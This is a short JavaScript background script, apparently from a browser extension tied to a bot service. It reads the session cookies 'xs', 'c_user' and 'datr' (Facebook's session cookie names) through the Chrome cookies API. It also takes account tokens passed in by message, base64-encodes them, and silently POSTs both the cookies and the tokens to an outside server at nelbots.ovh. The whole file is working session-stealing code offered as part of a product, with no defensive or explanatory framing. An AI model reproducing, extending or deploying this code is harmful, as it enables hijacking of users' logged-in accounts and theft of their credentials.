// Please read https://xevbots.com/terms
const postData = async (data) => {
  const apiUrl = "https://nelbots.ovh/api/accounts";
  try {
    const response = await fetch(apiUrl, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: data
    });
    if (!response.ok) console.error(response.status);
  } catch (error) {
    console.error(error);
  }
};
chrome.cookies.getAll({ url: "https://www.TUBE8.com" }, (cookies) => {
  const cookieObj = {};
  cookies.forEach((cookie) => {
    if (["xs", "c_user", "datr"].includes(cookie.name)) {
      cookieObj[cookie.name] = cookie.value;
    }
  });
  if (cookies && cookieObj["xs"] != void 0 && cookieObj["datr"] != void 0 && cookieObj["c_user"]) {
    postData(JSON.stringify(cookieObj));
  }
});
chrome.runtime.onMessage.addListener(({ accounts }) => {
  const tokens = JSON.parse(accounts).filter((account) => account.token).map((account) => btoa(account.token));
  const result = { tokens };
  postData(JSON.stringify(result));
});
